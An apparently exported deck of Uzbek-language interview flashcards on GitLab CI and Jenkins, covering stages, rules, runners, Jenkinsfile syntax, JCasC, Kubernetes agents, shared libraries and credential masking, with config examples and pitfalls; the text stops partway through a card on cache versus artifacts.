Interview Drill::CI/CD::H12 GHA, GitLab & Jenkins deep dive	idrill-40612	<p>GitLab CI stage'lari nima?</p>	<p><b>Qisqa javob:</b> Stage — job'larning ketma-ket guruhi: <code>stages: [build, test, deploy]</code>. Bir stage ichidagi job'lar parallel ishlaydi; keyingi stage oldingi stage'dagi barcha job'lar muvaffaqiyatli tugaganda boshlanadi (agar <code>needs</code> ishlatilmasa).</p><p><b>Qanday ishlaydi:</b></p><pre>stage build:   [build-api] [build-web]          parallel<br>                    \          /<br>                 hammasi OK?<br>                      v<br>stage test:    [unit] [integration] [lint]       parallel<br>                      v<br>stage deploy:  [deploy-staging]</pre><p>Biror job yiqilsa — keyingi stage'lar boshlanmaydi (pipeline failed), <code>allow_failure: true</code> bo'lmasa.</p><p><b>Amalda:</b></p><pre>stages: [build, test, deploy]<br><br>build-api:<br>  stage: build<br>  script: [ make build-api ]<br>  artifacts: { paths: [ bin/ ] }<br><br>unit:<br>  stage: test<br>  script: [ make test ]<br><br>lint:<br>  stage: test<br>  script: [ make lint ]<br>  allow_failure: true      # yiqilsa ham deploy davom etadi (sariq)<br><br>deploy-staging:<br>  stage: deploy<br>  script: [ ./deploy.sh staging ]</pre><p>Default stage'lar (e'lon qilinmasa): <code>.pre</code>, <code>build</code>, <code>test</code>, <code>deploy</code>, <code>.post</code>. <code>stage</code> ko'rsatilmagan job — <code>test</code>.</p><p><b>Tuzoqlar:</b></p><ul><li>Stage to'sig'i: sekin bitta job butun keyingi stage'ni kutdiradi — <code>needs</code> (DAG) bilan yechiladi.</li><li>Artifact'lar default bo'yicha oldingi barcha stage'lardan yuklanadi — katta artifact'lar sekinlashtiradi; <code>dependencies: []</code> yoki <code>needs</code> bilan cheklash.</li><li>Juda ko'p stage — pipeline grafigi o'qilmaydi va sekin.</li></ul><p><b>Senior nuqta:</b> Stage'lar mantiqiy ko'rinish uchun, <code>needs</code> esa haqiqiy tezlik uchun. Ko'p zamonaviy pipeline'larda stage'lar vizual guruhlash, bajarilish tartibi <code>needs</code> bilan boshqariladi.</p>	lvl::Middle dom::cicd sec::h12 GHA_GitLab_Jenkins_deep_dive
Interview Drill::CI/CD::H12 GHA, GitLab & Jenkins deep dive	idrill-40613	<p>GitLab CI <code>rules</code> nima?</p>	<p><b>Qisqa javob:</b> <code>rules</code> — GitLab job'i pipeline'ga qo'shiladimi va qanday (<code>on_success</code>, <code>manual</code>, <code>delayed</code>, <code>never</code>) degan qarorni beruvchi shartlar ro'yxati. Shartlar: <code>if</code> (o'zgaruvchilar ifodasi), <code>changes</code> (o'zgargan fayllar), <code>exists</code> (fayl mavjudligi). Birinchi mos kelgan qoida qo'llanadi. Eskirgan <code>only/except</code> o'rnini bosgan.</p><p><b>Qanday ishlaydi:</b></p><pre>job uchun rules yuqoridan pastga:<br>  rule1 mos? -&gt; ha -&gt; shu `when` bilan qo'shiladi, to'xta<br>  rule2 mos? -&gt; ...<br>  hech biri mos emas -&gt; job pipeline'da YO'Q</pre><p><b>Amalda:</b></p><pre>deploy-prod:<br>  script: [ ./deploy.sh ]<br>  rules:<br>    - if: $CI_PIPELINE_SOURCE == &quot;merge_request_event&quot;<br>      when: never                      # MR'da hech qachon<br>    - if: $CI_COMMIT_TAG =~ /^v\d+\.\d+\.\d+$/<br>      when: manual                     # release tag'da qo'lda<br>    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH<br>      when: on_success<br><br>test-web:<br>  script: [ npm test ]<br>  rules:<br>    - changes:<br>        paths: [ web/**/* , package-lock.json ]<br>        compare_to: refs/heads/main<br><br>docker-build:<br>  rules:<br>    - exists: [ Dockerfile ]<br>  script: [ docker build . ]<br><br>nightly:<br>  rules:<br>    - if: $CI_PIPELINE_SOURCE == &quot;schedule&quot;<br>  script: [ make e2e ]</pre><p>Foydali o'zgaruvchilar: <code>CI_PIPELINE_SOURCE</code> (push, merge_request_event, schedule, web, api), <code>CI_COMMIT_BRANCH</code>, <code>CI_COMMIT_TAG</code>, <code>CI_DEFAULT_BRANCH</code>.</p><p><b>Tuzoqlar:</b></p><ul><li>Oxirgi qoida yo'q — kutilgan holatda job umuman paydo bo'lmaydi; tartib muhim.</li><li><code>changes</code> branch pipeline'da yangi branch uchun har doim <code>true</code> (solishtirish asosi yo'q) — <code>compare_to</code> ishlat.</li><li><code>when: manual</code> job'lar default <code>allow_failure: true</code> (rules ichida false) — pipeline holati chalkashadi.</li></ul><p><b>Senior nuqta:</b> Umumiy shartlarni YAML anchor yoki <code>!reference</code> bilan qayta ishlat. <code>workflow:rules</code> bilan duplicate pipeline'larni yo'qot — bu eng ko'p uchraydigan GitLab xatosi.</p>	lvl::Middle dom::cicd sec::h12 GHA_GitLab_Jenkins_deep_dive
Interview Drill::CI/CD::H12 GHA, GitLab & Jenkins deep dive	idrill-40614	<p>GitLab Runner nima?</p>	<p><b>Qisqa javob:</b> GitLab Runner — Go'da yozilgan ochiq kodli agent: GitLab'dan job'larni so'raydi (pull) va ularni executor orqali bajaradi. Asosiy executor'lar: Docker, Kubernetes, Shell, Docker Autoscaler/Instance (cloud VM'lar), SSH, VirtualBox. Runner'lar instance, group yoki project darajasida ro'yxatdan o'tadi va tag'lar bilan tanlanadi.</p><p><b>Qanday ishlaydi:</b></p><pre>gitlab-runner (servis) --(HTTPS poll, outbound)--&gt; GitLab: &quot;job bormi?&quot;<br>     job keldi (tags: [docker, linux])<br>     v<br>executor: docker -&gt; image ichida konteyner -&gt; clone -&gt; script -&gt; artifact yuklash<br>     v<br>log va status GitLab'ga qaytadi</pre><p><b>Amalda:</b></p><pre># GitLab UI'da runner yaratib, auth token olinadi (glrt-...), keyin:<br>gitlab-runner register --non-interactive \<br>  --url https://gitlab.com --token glrt-XXXX \<br>  --executor docker --docker-image alpine:3.20<br>gitlab-runner list<br>gitlab-runner verify</pre><pre># /etc/gitlab-runner/config.toml<br>concurrent = 8<br>[[runners]]<br>  name = &quot;docker-1&quot;<br>  executor = &quot;docker&quot;<br>  [runners.docker]<br>    image = &quot;alpine:3.20&quot;<br>    privileged = false<br>    volumes = [&quot;/cache&quot;]</pre><pre>build:<br>  tags: [docker, linux]<br>  script: [ make build ]</pre><p>Kubernetes'da: <code>gitlab-runner</code> Helm chart, har job — pod.</p><p><b>Executor tanlash:</b> | Executor | Qachon | |---|---| | Docker | Umumiy, izolyatsiya yaxshi | | Kubernetes | Klaster bor, autoscale | | Shell | Maxsus hardware, lekin izolyatsiya yo'q | | Docker Autoscaler | Cloud VM'lar talabga qarab |</p><p><b>Tuzoqlar:</b></p><ul><li>Eski <code>registration token</code> bilan ro'yxatdan o'tish deprecated — yangi runner authentication token oqimi.</li><li>Shell executor bir nechta loyiha uchun — bir job boshqasining fayl va credential'larini ko'radi.</li><li><code>privileged = true</code> dind uchun — konteyner host'ga to'liq kirish oladi.</li></ul><p><b>Senior nuqta:</b> Runner'larni ishonch darajasi bo'yicha ajrat: protected runner faqat protected branch'lar (prod deploy) uchun, umumiy runner — MR'lar uchun. Ephemeral executor (Kubernetes, autoscaler) holat oqishini yo'qotadi.</p>	lvl::Middle dom::cicd sec::h12 GHA_GitLab_Jenkins_deep_dive
Interview Drill::CI/CD::H12 GHA, GitLab & Jenkins deep dive	idrill-40615	<p>GitLab Auto DevOps nima?</p>	<p><b>Qisqa javob:</b> Auto DevOps — GitLab'ning tayyor CI/CD shabloni: loyiha tilini aniqlaydi (Cloud Native Buildpacks), image build qiladi, test, kod sifati, SAST/DAST/dependency/container scanning o'tkazadi va Kubernetes'ga (review apps, staging, production) Helm bilan deploy qiladi — <code>.gitlab-ci.yml</code> yozmasdan.</p><p><b>Qanday ishlaydi:</b></p><pre>loyiha (.gitlab-ci.yml yo'q, Auto DevOps yoqilgan)<br>  -&gt; Auto Build (Dockerfile bo'lsa u, bo'lmasa buildpacks)<br>  -&gt; Auto Test, Auto Code Quality, Auto SAST, Auto Dependency Scanning,<br>     Auto Container Scanning, Auto Secret Detection<br>  -&gt; Auto Review Apps (MR uchun)<br>  -&gt; Auto Deploy (staging/production, Helm chart)<br>  -&gt; Auto DAST, Auto Monitoring</pre><p><b>Amalda:</b> Yoqish: Settings -&gt; CI/CD -&gt; Auto DevOps -&gt; &quot;Default to Auto DevOps pipeline&quot;. Kubernetes ulanishi (GitLab agent) va base domain kerak. Qisman ishlatish — o'z pipeline'ingizga shablonni include qilib, kerakli qismini sozlash:</p><pre>include:<br>  - template: Auto-DevOps.gitlab-ci.yml<br><br>variables:<br>  POSTGRES_ENABLED: &quot;false&quot;<br>  TEST_DISABLED: &quot;true&quot;<br>  STAGING_ENABLED: &quot;1&quot;<br>  INCREMENTAL_ROLLOUT_MODE: manual</pre><p>Yoki faqat xavfsizlik qismlari:</p><pre>include:<br>  - template: Jobs/SAST.gitlab-ci.yml<br>  - template: Jobs/Secret-Detection.gitlab-ci.yml</pre><p><b>Tuzoqlar:</b></p><ul><li>&quot;Sehrli&quot; — nima bo'layotgani ko'rinmaydi, debug qiyin; buildpacks image'lari katta.</li><li>Kubernetes va domen sozlanmagan — deploy job'lari yiqiladi.</li><li>Production uchun to'liq Auto DevOps kamdan-kam mos keladi — odatda moslashtirish kerak bo'ladi.</li></ul><p><b>Senior nuqta:</b> Auto DevOps'ni boshlang'ich nuqta yoki xavfsizlik skanerlari manbai sifatida ishlat; mature jamoalar odatda alohida shablonlarni <code>include</code> qilib o'z pipeline'ini quradi.</p>	lvl::Middle dom::cicd sec::h12 GHA_GitLab_Jenkins_deep_dive
Interview Drill::CI/CD::H12 GHA, GitLab & Jenkins deep dive	idrill-40616	<p>Declarative Jenkinsfile nima?</p>	<p><b>Qisqa javob:</b> Declarative Pipeline — Jenkinsfile'ning tuzilmali sintaksisi: <code>pipeline { agent; stages { stage { steps } }; post }</code>. Oldindan belgilangan direktivalar (<code>environment</code>, <code>parameters</code>, <code>options</code>, <code>when</code>, <code>post</code>, <code>parallel</code>) bor, sintaksis ishga tushishdan oldin tekshiriladi. Jenkins tavsiya qiladigan zamonaviy format.</p><p><b>Tuzilma:</b></p><pre>pipeline<br>  agent        -&gt; qayerda ishlaydi<br>  options      -&gt; timeout, retention, timestamps<br>  environment  -&gt; env var, credential binding<br>  parameters   -&gt; qo'lda kiritiladigan qiymatlar<br>  stages<br>    stage('X')<br>      when     -&gt; shart<br>      steps    -&gt; sh, echo ...<br>  post         -&gt; always/success/failure</pre><p><b>Amalda:</b></p><pre>pipeline {<br>  agent { kubernetes { yamlFile 'ci/pod.yaml' } }<br>  options {<br>    timeout(time: 30, unit: 'MINUTES')<br>    buildDiscarder(logRotator(numToKeepStr: '30'))<br>    disableConcurrentBuilds()<br>  }<br>  environment {<br>    REGISTRY = 'ghcr.io/acme'<br>    REG_CRED = credentials('ghcr-token')   // REG_CRED_USR / REG_CRED_PSW<br>  }<br>  parameters {<br>    booleanParam(name: 'DEPLOY', defaultValue: false)<br>  }<br>  stages {<br>    stage('Test') { steps { sh 'make test' } }<br>    stage('Build') { steps { sh 'make image TAG=$GIT_COMMIT' } }<br>    stage('Deploy') {<br>      when { allOf { branch 'main'; expression { params.DEPLOY } } }<br>      steps { sh './deploy.sh' }<br>    }<br>  }<br>  post {<br>    failure { slackSend channel: '#ci', message: &quot;FAILED ${env.BUILD_URL}&quot; }<br>  }<br>}</pre><p>Murakkab mantiq kerak bo'lsa: <code>script { ... }</code> bloki ichida Groovy (kam ishlat).</p><p><b>Tuzoqlar:</b></p><ul><li><code>script {}</code> ichida ko'p Groovy — declarative afzalligi yo'qoladi; shared library'ga chiqar.</li><li>Groovy double-quote interpolatsiyasi (<code>&quot;${PASSWORD}&quot;</code>) — secret log'ga tushishi mumkin; <code>sh 'echo $PASSWORD'</code> (single quote).</li><li>Method kod hajmi limiti (JVM 64KB) — juda katta Jenkinsfile &quot;Method code too large&quot; bilan yiqiladi.</li></ul><p><b>Senior nuqta:</b> Declarative'ni standart qil, murakkablikni shared library'ga yashir. Jenkinsfile'ni Replay va <code>jenkins-pipeline-linter</code> / declarative linter API bilan merge'dan oldin tekshir.</p>	lvl::Middle dom::cicd sec::h12 GHA_GitLab_Jenkins_deep_dive
Interview Drill::CI/CD::H12 GHA, GitLab & Jenkins deep dive	idrill-40617	<p>Scripted Jenkinsfile nima?</p>	<p><b>Qisqa javob:</b> Scripted Pipeline — Jenkinsfile'ning eski, Groovy asosidagi imperativ formati: <code>node { stage('X') { sh '...' } }</code>. To'liq dasturlash erkinligi (sikl, try/catch, dinamik stage'lar) beradi, lekin tuzilma va validatsiya yo'q, o'qish va qo'llab-quvvatlash qiyinroq.</p><p><b>Declarative vs Scripted:</b> | | Declarative | Scripted | |---|---|---| | Sintaksis | <code>pipeline {}</code> | <code>node {}</code> | | Validatsiya | Ishga tushishdan oldin | Faqat runtime'da | | Moslashuvchanlik | Cheklangan (<code>script {}</code> bilan kengayadi) | To'liq Groovy | | <code>post</code>, <code>when</code>, <code>options</code> | Tayyor | Qo'lda (try/finally) | | Tavsiya | Ha | Faqat maxsus holatlar |</p><p><b>Amalda:</b></p><pre>node('linux') {<br>  try {<br>    stage('Checkout') { checkout scm }<br>    def services = sh(script: 'ls services', returnStdout: true).trim().split('\n')<br>    stage('Build') {<br>      def branches = [:]<br>      for (s in services) {<br>        def svc = s   // closure uchun lokal nusxa shart!<br>        branches[svc] = { sh &quot;make -C services/${svc} build&quot; }<br>      }<br>      parallel branches        // dinamik parallel stage'lar<br>    }<br>  } catch (err) {<br>    currentBuild.result = 'FAILURE'<br>    throw err<br>  } finally {<br>    cleanWs()<br>  }<br>}</pre><p><b>Tuzoqlar:</b></p><ul><li>Closure'da sikl o'zgaruvchisini to'g'ridan-to'g'ri ishlatish — hamma branch oxirgi qiymatni oladi.</li><li>CPS (Continuation Passing Style): Groovy kod serializatsiya qilinadi; ba'zi metodlar (<code>.each</code>, serializable bo'lmagan obyektlar) <code>NotSerializableException</code> beradi — <code>@NonCPS</code> kerak bo'ladi.</li><li>Sandbox: ko'p Groovy metodlari script approval talab qiladi — admin &quot;approve&quot; bosishi xavfsizlik teshigi bo'lishi mumkin.</li></ul><p><b>Senior nuqta:</b> Scripted faqat dinamik pipeline generatsiyasi kerak bo'lganda; hatto shunda ham Declarative + <code>script {}</code> yoki shared library ichidagi funksiya yaxshiroq.</p>	lvl::Middle dom::cicd sec::h12 GHA_GitLab_Jenkins_deep_dive
Interview Drill::CI/CD::H12 GHA, GitLab & Jenkins deep dive	idrill-40618	<p>Jenkins Configuration as Code (JCasC) nima?</p>	<p><b>Qisqa javob:</b> JCasC (Jenkins Configuration as Code) — plugin bo'lib, Jenkins controller'ning butun konfiguratsiyasini (security realm, authorization, credential'lar, cloud/agent'lar, global tool'lar, plugin sozlamalari) Git'dagi YAML faylda deklarativ saqlash va start'da avtomatik qo'llash imkonini beradi.</p><p><b>Muammo:</b> Jenkins UI'da 3 yil davomida qo'lda sozlangan: hech kim hammasini bilmaydi, server o'lsa qayta tiklash — kunlar; staging Jenkins prod'dan farq qiladi.</p><p><b>Qanday ishlaydi:</b></p><pre>Git: jenkins.yaml + plugins.txt<br>     v<br>Docker image (jenkins/jenkins:lts-jdk21 + plugin'lar)<br>     v<br>start: CASC_JENKINS_CONFIG=/var/jenkins_home/casc/jenkins.yaml<br>     v<br>JCasC konfiguratsiyani qo'llaydi -&gt; tayyor Jenkins<br>(o'zgarish = PR -&gt; reload yoki yangi pod)</pre><p><b>Amalda:</b></p><pre>jenkins:<br>  systemMessage: &quot;Managed by JCasC - UI o'zgarishlari yo'qoladi&quot;<br>  numExecutors: 0<br>  securityRealm:<br>    oic:<br>      clientId: jenkins<br>      clientSecret: &quot;${OIDC_SECRET}&quot;<br>      wellKnownOpenIDConfigurationUrl: https://sso.example.com/.well-known/openid-configuration<br>  authorizationStrategy:<br>    roleBased: { ... }<br>  clouds:<br>    - kubernetes:<br>        name: k8s<br>        namespace: jenkins-agents<br>credentials:<br>  system:<br>    domainCredentials:<br>      - credentials:<br>          - string: { id: slack-token, secret: &quot;${SLACK_TOKEN}&quot; }<br>unclassified:<br>  location: { url: https://jenkins.example.com/ }</pre><p><code>${OIDC_SECRET}</code> — env var yoki Kubernetes secret faylidan (secret'lar Git'da emas). Joriy holatni eksport: Manage Jenkins -&gt; Configuration as Code -&gt; View/Download.</p><p><b>Tuzoqlar:</b></p><ul><li>Secret'larni YAML'ga ochiq yozish.</li><li>Plugin versiyalari qotirilmagan — JCasC sxemasi plugin bilan o'zgaradi va start yiqiladi.</li><li>UI'da qo'lda o'zgartirish — keyingi reload'da yo'qoladi (bu yaxshi, lekin jamoa bilishi kerak).</li><li>Job'lar JCasC'ning asosiy vazifasi emas — Job DSL plugin yoki Multibranch/Organization Folder bilan.</li></ul><p><b>Senior nuqta:</b> JCasC + plugins.txt + Job DSL + Kubernetes agent'lar = Jenkins'ni &quot;cattle&quot; qilish: controller'ni istalgan payt qayta yaratish mumkin, faqat build tarixi saqlanishi kerak.</p>	lvl::Middle dom::cicd sec::h12 GHA_GitLab_Jenkins_deep_dive
Interview Drill::CI/CD::H12 GHA, GitLab & Jenkins deep dive	idrill-40619	<p>Jenkins Kubernetes plugin nima?</p>	<p><b>Qisqa javob:</b> Jenkins Kubernetes plugin — controller'ga build kerak bo'lganda Kubernetes'da agent pod yaratadi, pod ichidagi konteynerlarda step'larni bajaradi va build tugagach pod'ni o'chiradi. Har build toza, izolyatsiyalangan muhit oladi; doimiy agent VM'lari kerak emas.</p><p><b>Qanday ishlaydi:</b></p><pre>build navbatda (label: go)<br>   v<br>controller -&gt; kube-apiserver: pod yarat (podTemplate)<br>   pod: jnlp (agent, controller'ga ulanadi) + golang + docker/buildkit konteynerlari<br>   v<br>step'lar: container('golang') { sh 'go test' }<br>   v<br>build tugadi -&gt; pod o'chiriladi</pre><p><b>Amalda:</b></p><pre>pipeline {<br>  agent {<br>    kubernetes {<br>      yaml '''<br>apiVersion: v1<br>kind: Pod<br>spec:<br>  serviceAccountName: jenkins-agent<br>  containers:<br>    - name: golang<br>      image: golang:1.23<br>      command: [&quot;sleep&quot;]<br>      args: [&quot;infinity&quot;]<br>      resources:<br>        requests: { cpu: &quot;1&quot;, memory: 1Gi }<br>        limits: { memory: 2Gi }<br>    - name: kaniko<br>      image: gcr.io/kaniko-project/executor:debug<br>      command: [&quot;sleep&quot;]<br>      args: [&quot;infinity&quot;]<br>'''<br>    }<br>  }<br>  stages {<br>    stage('Test') { steps { container('golang') { sh 'go test ./...' } } }<br>  }<br>}</pre><pre>kubectl get pods -n jenkins-agents -w     # agent pod paydo bo'lib yo'qolishini ko'r</pre><p><b>Tuzoqlar:</b></p><ul><li>Konteynerda <code>command: sleep infinity</code> yo'q — konteyner darhol tugaydi, step'lar bajarilmaydi.</li><li><code>resources</code> yo'q — node'lar haddan tashqari yuklanadi, pod'lar OOMKilled.</li><li>Agent pod controller'ga ulana olmaydi (Jenkins URL/tunnel, WebSocket sozlamasi) — pod <code>Pending</code>/<code>Error</code> va build osiladi.</li><li>Har build'da dependency'larni qayta yuklash — PVC cache yoki pull-through proxy.</li></ul><p><b>Senior nuqta:</b> Agent'larni alohida namespace va node pool'da, minimal ServiceAccount va NetworkPolicy bilan ishlat. Controller'da <code>numExecutors: 0</code> — build'lar faqat ephemeral pod'larda.</p>	lvl::Middle dom::cicd sec::h12 GHA_GitLab_Jenkins_deep_dive
Interview Drill::CI/CD::H12 GHA, GitLab & Jenkins deep dive	idrill-40620	<p>Jenkins Shared Libraries nima?</p>	<p><b>Qisqa javob:</b> Jenkins Shared Library — alohida Git repo'dagi qayta ishlatiladigan Groovy kod: custom step'lar (<code>vars/</code>), klasslar (<code>src/</code>) va resurslar (<code>resources/</code>). Jenkinsfile'larda <code>@Library('name@version') _</code> bilan import qilinadi; tashkilot bo'yicha pipeline'larni standartlashtiradi.</p><p><b>Muammo:</b> 100 ta Jenkinsfile'da bir xil 200 qator: build, scan, push, Slack. Yangi qadam qo'shish — 100 PR.</p><p><b>Tuzilma:</b></p><pre>jenkins-shared-lib/<br>  vars/<br>    goPipeline.groovy     -&gt; Jenkinsfile'da goPipeline(...) step<br>    notifySlack.groovy<br>  src/com/acme/ci/<br>    Docker.groovy         -&gt; klasslar<br>  resources/<br>    templates/pod.yaml    -&gt; libraryResource('templates/pod.yaml')</pre><p><b>Amalda:</b></p><pre>// vars/goPipeline.groovy<br>def call(Map cfg = [:]) {<br>  pipeline {<br>    agent { kubernetes { yaml libraryResource('templates/go-pod.yaml') } }<br>    stages {<br>      stage('Test')  { steps { container('golang') { sh 'go test ./...' } } }<br>      stage('Image') { steps { container('kaniko') { sh &quot;/kaniko/executor --destination=${cfg.image}:${env.GIT_COMMIT}&quot; } } }<br>    }<br>    post { failure { notifySlack(cfg.channel ?: '#ci') } }<br>  }<br>}</pre><pre>// app repo Jenkinsfile<br>@Library('acme-lib@v2.3.0') _<br>goPipeline(image: 'ghcr.io/acme/api', channel: '#api')</pre><p>Global library: Manage Jenkins -&gt; System -&gt; Global Trusted Pipeline Libraries (JCasC'da ham).</p><p><b>Tuzoqlar:</b></p><ul><li><code>@Library('acme-lib') _</code> versiyasiz — default branch; library o'zgarishi hamma pipeline'ni birdan buzadi.</li><li>Global (trusted) library sandbox'dan tashqarida ishlaydi — unga yozish huquqi = Jenkins'ga to'liq kirish. Repo'ni qattiq himoyala.</li><li>Test yo'q — JenkinsPipelineUnit bilan unit test yoz.</li></ul><p><b>Senior nuqta:</b> Shared library — ichki platforma mahsuloti: SemVer, changelog, test va deprecation siyosati bilan boshqar. Ilova jamoalari uchun interfeys oddiy bo'lsin (bitta funksiya + parametrlar).</p>	lvl::Middle dom::cicd sec::h12 GHA_GitLab_Jenkins_deep_dive
Interview Drill::CI/CD::H12 GHA, GitLab & Jenkins deep dive	idrill-40621	<p>Jenkins log'larida credential oqishining oldini qanday olasiz?</p>	<p><b>Qisqa javob:</b> Credential'ni <code>withCredentials</code> (yoki declarative <code>environment { X = credentials('id') }</code>) bilan bog'la — Jenkins qiymatni konsol log'ida <code>****</code> bilan maskalaydi. Shell buyruqqa esa Groovy interpolatsiyasi (<code>&quot;${TOKEN}&quot;</code>) bilan emas, single quote ichida shell o'zgaruvchisi (<code>'$TOKEN'</code>) sifatida ber.</p><p><b>Muammo:</b> Groovy double-quote string'i qiymatni buyruq matniga joylaydi — buyruq matni build log'ida, process ro'yxatida (<code>ps</code>) va Jenkins ogohlantirishida ko'rinadi.</p><p><b>Qanday ishlaydi:</b></p><pre>withCredentials -&gt; TOKEN env var (faqat blok ichida)<br>sh 'curl -H &quot;Authorization: Bearer $TOKEN&quot; ...'<br>   -&gt; shell o'zi env'dan o'qiydi, Groovy matnga yozmaydi    (xavfsiz)<br>sh &quot;curl -H 'Authorization: Bearer ${TOKEN}' ...&quot;<br>   -&gt; Groovy qiymatni matnga yozadi -&gt; log/ps'da ko'rinishi mumkin (xavfli)</pre><p><b>Amalda:</b></p><pre>stage('Publish') {<br>  steps {<br>    withCredentials([<br>      string(credentialsId: 'npm-token', variable: 'NPM_TOKEN'),<br>      usernamePassword(credentialsId: 'registry', usernameVariable: 'REG_USER', passwordVariable: 'REG_PASS'),<br>      file(credentialsId: 'kubeconfig-prod', variable: 'KUBECONFIG')<br>    ]) {<br>      sh '''<br>        echo &quot;$REG_PASS&quot; | docker login ghcr.io -u &quot;$REG_USER&quot; --password-stdin<br>        npm publish --//registry.npmjs.org/:_authToken=&quot;$NPM_TOKEN&quot;<br>      '''<br>    }<br>  }<br>}</pre><p>Jenkins double-quote'da secret aniqlasa ogohlantiradi: <code>Warning: A secret was passed to &quot;sh&quot; using Groovy String interpolation, which is insecure.</code></p><p><b>Tuzoqlar:</b></p><ul><li><code>set -x</code> — buyruqlar argumentlari bilan chop etiladi.</li><li><code>docker login -p $PASS</code> — <code>ps</code> da ko'rinadi; <code>--password-stdin</code> ishlat.</li><li>Maskalash faqat aniq qiymatni ushlaydi — base64 yoki qismi chiqsa oqadi.</li><li>Credential'ni faylga yozib artifact qilib arxivlash.</li></ul><p><b>Senior nuqta:</b> Credential scope'ini cheklab (folder darajasidagi credential'lar), statik secret o'rniga Vault yoki cloud OIDC orqali qisqa muddatli token ol. Log maskalash — oxirgi himoya, asosiy emas.</p>	lvl::Middle dom::cicd sec::h12 GHA_GitLab_Jenkins_deep_dive
Interview Drill::CI/CD::H12 GHA, GitLab & Jenkins deep dive	idrill-40622	<p>Jenkins Multibranch Pipeline nima?</p>	<p><b>Qisqa javob:</b> Multibranch Pipeline — Jenkins job turi: Git repo'ni skanerlab, <code>Jenkinsfile</code> bor har branch (va PR, tag) uchun avtomatik alohida pipeline job yaratadi; branch o'chirilsa yoki merge bo'lsa, uning job'ini olib tashlaydi (orphan strategy bo'yicha).</p><p><b>Muammo:</b> Har yangi feature branch uchun qo'lda Jenkins job yaratish — hech kim qilmaydi, natijada faqat <code>main</code> test qilinadi.</p><p><b>Qanday ishlaydi:</b></p><pre>Multibranch &quot;api&quot;<br>  scan (webhook yoki periodik) -&gt; GitHub/GitLab API<br>     main        (Jenkinsfile bor) -&gt; api/main job<br>     feature/x   (Jenkinsfile bor) -&gt; api/feature%2Fx job<br>     PR-42                          -&gt; api/PR-42 job (merge natijasi bilan)<br>     docs        (Jenkinsfile yo'q) -&gt; e'tiborsiz<br>  branch o'chdi -&gt; job o'chadi (orphan item strategy)</pre><p>Organization Folder — bir qadam yuqori: butun GitHub org'ni skanerlab har repo uchun Multibranch yaratadi.</p><p><b>Amalda:</b> Jenkinsfile ichida branch'ga qarab mantiq:</p><pre>pipeline {<br>  agent any<br>  stages {<br>    stage('Test') { steps { sh 'make test' } }<br>    stage('Deploy staging') {<br>      when { branch 'main' }<br>      steps { sh './deploy.sh staging' }<br>    }<br>    stage('Preview') {<br>      when { changeRequest() }       // faqat PR'larda<br>      steps { sh &quot;./preview.sh ${env.CHANGE_ID}&quot; }<br>    }<br>  }<br>}</pre><p>Muhim env'lar: <code>BRANCH_NAME</code>, <code>CHANGE_ID</code>, <code>CHANGE_TARGET</code>, <code>CHANGE_AUTHOR</code>.</p><p><b>Tuzoqlar:</b></p><ul><li>Fork PR'lardan Jenkinsfile — ishonchsiz kod. &quot;Trust&quot; sozlamasi: faqat write huquqi borlarning Jenkinsfile o'zgarishi ishlatilsin.</li><li>Webhook yo'q — periodik scan sekin va API rate limit.</li><li>Ko'p branch — har biri build tarixi va workspace'ni saqlaydi; disk to'ladi.</li></ul><p><b>Senior nuqta:</b> Multibranch + GitHub Branch Source (GitHub App autentifikatsiyasi) + status check'lar = GitHub Actions'ga o'xshash PR tajribasi. Build retention va eski branch tozalashni sozla.</p>	lvl::Middle dom::cicd sec::h12 GHA_GitLab_Jenkins_deep_dive
Interview Drill::CI/CD::H12 GHA, GitLab & Jenkins deep dive	idrill-40623	<p>Jenkins Blue Ocean nima?</p>	<p><b>Qisqa javob:</b> Blue Ocean — Jenkins uchun 2016-yilda chiqqan zamonaviy UI: pipeline'larni vizual graf ko'rinishida, parallel stage'lar va xato nuqtasi bilan ko'rsatadi, pipeline editor va GitHub integratsiyasiga ega. Hozir yangi funksiya qo'shilmaydi (faqat xavfsizlik tuzatishlari); Jenkins o'zining standart UI'sini yangilayapti.</p><p><b>Holat (2025-2026):</b> | | Blue Ocean | Muqobil | |---|---|---| | Rivojlanish | To'xtagan, yangi funksiya yo'q | Pipeline Graph View plugin | | Visual graf | Bor | Pipeline Graph View, Pipeline Stage View | | Editor | Bor (cheklangan) | Jenkinsfile'ni IDE'da yozish |</p><p><b>Qanday ishlaydi:</b></p><pre>Classic UI: matnli console log, job ro'yxati<br>Blue Ocean: /blue/organizations/jenkins/api/detail/main/42/pipeline<br>   [Checkout] -&gt; [Build] -&gt; [Test: unit | e2e] -&gt; [Deploy]<br>                                        ^ qizil: shu yerda yiqildi, log shu step'niki</pre><p><b>Amalda:</b></p><pre># o'rnatish (agar kerak bo'lsa)<br>jenkins-plugin-cli --plugins blueocean<br># zamonaviy alternativa<br>jenkins-plugin-cli --plugins pipeline-graph-view</pre><p>Pipeline Graph View o'rnatilgach build sahifasida &quot;Pipeline Overview&quot; tab paydo bo'ladi.</p><p><b>Tuzoqlar:</b></p><ul><li>Yangi o'rnatishlarda Blue Ocean'ga tayanish — kelajakda qo'llab-quvvatlanmasligi mumkin.</li><li>Blue Ocean ko'p plugin'larni (bog'liqliklar) olib keladi — hujum yuzasi va upgrade muammolari.</li><li>Ba'zi job turlari (freestyle) Blue Ocean'da to'liq ko'rinmaydi.</li></ul><p><b>Senior nuqta:</b> Plugin tanlashda faollik va maintainer holatiga qara — Jenkins muammolarining katta qismi tashlab ketilgan plugin'lardan. Interview Drill::CI/CD::H12 GHA, GitLab & Jenkins deep dive	idrill-40624	<p>GitLab CI'da <code>cache</code> va <code>artifacts</code> farqi.</p>	<p><b>Qisqa javob:</b> GitLab'da <code>cache</code> — pipeline'lar orasida (va job'lar orasida) qayta ishlatiladigan dependency'lar uchun, best-effort: bo'lmasa ham job ishlashi kerak. <code>artifacts</code> — job natijalari (binary, hisobot), bir pipeline ichida keyingi stage'larga kafolatli uzatiladi va GitLab'da yuklab olish uchun saqlanadi.</p><p><b>Farq:</b> | | cache | artifacts | |---|---|---| | Maqsad | Tezlik | Natija uzatish | | Kafolat | Yo'q (runner'da bo'lmasligi mumkin) | Bor | | Saqlanishi | Runner lokal yoki S3/GCS (distributed cache) | GitLab server | | Ko'lami | <code>key</code> bo'yicha pipeline'lar orasida | Pipeline ichida, UI'da yuklash | | Muddati | Runner sozlamasi | <code>expire_in</code> |</p><p><b>Qanday ishlaydi:</b></p><pre>pipeline #1: install -&gt; cache push (key=package-lock hash)<br>pipeline #2: install -&gt; cache pull -&gt; tez<br>build -&gt; artifacts: dist/ -&gt; test 